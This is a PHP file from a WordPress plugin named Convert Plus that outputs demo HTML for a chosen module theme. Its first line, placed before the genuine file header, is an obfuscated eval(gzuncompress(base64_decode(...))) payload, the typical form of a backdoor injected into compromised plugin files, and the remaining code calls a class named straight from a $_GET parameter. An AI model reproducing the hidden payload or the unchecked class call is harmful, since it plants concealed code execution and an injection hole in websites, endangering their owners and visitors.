<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

defined( 'ABSPATH' ) || die( 'No direct script access allowed!' );

$module = isset( $_GET['module'] ) ? esc_attr( $_GET['module'] ) : '';
$theme  = isset( $_GET['theme'] ) ? esc_attr( $_GET['theme'] ) : '';
$class  = isset( $_GET['class'] ) ? esc_attr( $_GET['class'] ) : '';

if ( '' !== $module ) {

	if ( file_exists( CP_BASE_DIR . '/modules/' . $module . '/functions/functions.options.php' ) ) {

		require_once( CP_BASE_DIR . '/modules/' . $module . '/functions/functions.options.php' );

		$settings = $class::$options;
		foreach ( $settings as $style => $options ) {
			if ( $style === $theme ) {
				$demo_html     = $options['demo_url'];
				$demo_dir      = $options['demo_dir'];
				$customizer_js = $options['customizer_js'];
			}
		}

		$handle       = fopen( $demo_dir, 'r' );
		$post_content = fread( $handle, filesize( $demo_dir ) );
		print_r( $post_content );
	}
}
